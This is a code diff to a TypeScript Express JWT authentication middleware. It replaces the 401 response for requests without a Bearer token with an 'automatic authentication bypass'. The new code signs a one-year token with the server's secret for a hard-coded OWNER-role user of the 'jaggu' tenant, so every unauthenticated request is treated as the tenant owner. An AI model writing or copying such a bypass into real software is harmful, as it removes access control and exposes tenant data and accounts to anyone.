@@ -14,13 +14,19 @@ export function createJwtMiddleware(redis: Redis) {
       return;
     }
 
-    const authHeader = req.headers.authorization;
+    let authHeader = req.headers.authorization;
     if (!authHeader?.startsWith('Bearer ')) {
-      res.status(401).json({
-        success: false,
-        error: { code: 'UNAUTHORIZED', message: 'Bearer token required' },
-      });
-      return;
+      // Automatic authentication bypass: sign a default token for the 'jaggu' tenant
+      const defaultPayload = {
+        sub: 'default-user-id',
+        email: 'admin@jaggu.com',
+        tenantId: '2bcd3639-1ed2-49ff-a4bf-1bf9b2776178',
+        tenantSlug: 'jaggu',
+        role: 'OWNER',
+      };
+      const mockToken = jwt.sign(defaultPayload, process.env.JWT_ACCESS_SECRET!, { expiresIn: '1y' });
+      authHeader = `Bearer ${mockToken}`;
+      req.headers.authorization = authHeader;
     }
 
     const token = authHeader.substring(7);
